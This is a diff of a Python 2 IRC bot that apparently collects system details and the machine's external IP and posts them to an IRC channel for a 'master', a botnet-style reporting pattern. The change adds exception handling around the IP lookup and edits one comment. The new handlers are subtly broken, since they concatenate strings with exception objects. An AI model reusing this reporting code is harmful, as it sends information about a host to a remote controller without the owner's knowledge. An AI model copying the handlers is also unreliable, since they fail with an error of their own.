@@ -54,8 +54,22 @@ def sysinfo(): # Function to obtain system information
   sendmsg(channel, 'Language: ' + locale.getdefaultlocale()[0])
 
 def get_external_ip(): # Function to get external ip address
-  ip = urllib2.urlopen('http://automation.whatismyip.com/n09230945.asp').read()
-  sendmsg(channel, 'Connecting from ' + ip + ' to serve you master!')
+  try:
+    ip = urllib2.urlopen('http://automation.whatismyip.com/n09230945.asp').read()
+    sendmsg(channel, 'Connecting from ' + ip + ' to serve you master!')
+
+  except urllib2.HTTPError, e:
+    print 'There was an HTTP error: ' + e
+    sendmsg(channel, 'There was an HTTP error: ' + e)
+
+  except urllib2.URLError, e:
+    print 'There was a problem with the URL: ' + e
+    sendmsg(channel, 'There was a problem with the URL: ' + e)
+
+  except urllib2.IOError, e:
+    print 'There was an IOError ' + e
+    sendmsg(channel, 'There was an IOError: ' + e)
+
 
 def sendmsg(chan , msg): # Function to send messages to the channel
   ircsock.send('PRIVMSG '+ chan +' :'+ msg +'\n')
@@ -75,7 +89,7 @@ def connect(): # Connects to the server, finds commands, etc.
 def main():
   os.system('clear') # Clear the screen
   banner() # Print the banner
-  connect() # Connect to the server
+  connect() # Connect to the Server
 
   while 1: # WARNING: May cause an infinite loop
 
